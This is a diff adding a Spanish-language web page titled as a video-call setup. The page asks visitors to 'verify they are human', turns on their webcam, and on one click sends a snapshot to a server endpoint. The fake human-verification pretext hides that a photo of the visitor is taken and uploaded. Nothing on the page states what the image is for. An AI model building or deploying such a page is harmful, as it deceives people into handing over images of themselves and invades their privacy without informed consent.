@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Setup de Videollamada</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background-color: #f5f6fa;
+      padding: 20px;
+    }
+    h1 {
+      color: #1e3799;
+      font-size: 24px;
+    }
+    p {
+      color: #2f3640;
+      max-width: 500px;
+      margin: 0 auto 20px;
+      font-size: 16px;
+    }
+    video {
+      border: 2px solid #273c75;
+      border-radius: 8px;
+      margin: 20px 0;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #273c75;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #192a56;
+    }
+  </style>
+</head>
+<body>
+  <h1>Verifica que eres un humano</h1>
+  <p>Verifica que eres un humanos. Permite el acceso y haz clic en "Probar Ahora".</p>
+  <video id="video" width="640" height="480" autoplay></video>
+  <button id="capture">Probar Ahora</button>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const captureButton = document.getElementById('capture');
+
+    // Pedir permiso para la cámara
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        alert('Por favor, permite el acceso a la cámara.');
+      });
+
+    // Tomar foto al hacer clic
+    captureButton.addEventListener('click', () => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      const photo = canvas.toDataURL('image/png');
+
+      // Enviar la foto al servidor
+      fetch('/api/send-photo', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ photo })
+      })
+      .then(response => response.json())
+      .then(data => alert(data.message))
+      .catch(err => alert('Error al enviar la foto. Intenta de nuevo.'));
+    });
+  </script>
+</body>
+</html>
